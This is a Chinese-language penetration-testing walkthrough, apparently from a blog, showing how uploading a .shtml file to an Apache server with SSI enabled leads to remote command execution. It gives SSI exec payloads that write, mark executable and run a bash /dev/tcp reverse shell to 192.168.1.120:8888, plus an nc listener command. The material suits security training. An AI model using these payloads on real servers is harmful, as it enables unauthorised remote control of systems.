# Apache SSI远程命令执行漏洞

**原理：测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件，如果目标服务器开启了SSI和CGI支持，我们可以上传应该shtml类型文件，并利用`<!--#exec cmd="id" -->`语法执行任意命令，或反弹shell**



访问目标网站.

![image-20210510175042917](https://img-blog.csdnimg.cn/img_convert/150573811ad774116207e535322102a3.png)

准备一个shtml内容文件

内容如下：![image-20210510173217142](https://img-blog.csdnimg.cn/img_convert/01727f97389c5448b7c6bf5559e960f9.png)

上传该文件

![image-20210510173300496](https://img-blog.csdnimg.cn/img_convert/db461ad46fddbdcc4470f624346448ca.png)

![img](https://img-blog.csdnimg.cn/img_convert/53319c9a8d4ca9e2a8325871430d4622.png)



文件上传成功，点击该超链接

![image-20210510173336927](https://img-blog.csdnimg.cn/img_convert/769b6d8b0cbde61332e5284e95cce7aa.png)

可以看到命令被执行了



**反弹shell**

准备一个带有shell的shtml文件，内容如下

```
<!--#exec cmd="echo 'bash -i >& /dev/tcp/192.168.1.120/8888 0>&1' > /var/www/html/shell.sh"-->
# 在/var/www/html/目录下创建一个反弹shell命令的shell.sh文件

<!--#exec cmd="chmod +x /var/www/html/shell.sh"-->
# 赋予该文件以执行权限

<!--#exec cmd="/bin/bash /var/www/html/shell.sh"-->
# 执行该文件
```

上传该文件：

![image-20210510182320029](https://img-blog.csdnimg.cn/img_convert/ff883aa255eec5f0edb9964e407f5b44.png)



在kali中监听端口

nc -lvvp 8888

![image-20220417183611924](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220417183611924.png)



点击超链接，等待shell反弹：

![image-20220417183650217](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220417183650217.png)



可以看到反弹shell成功，命令也成功执行了



















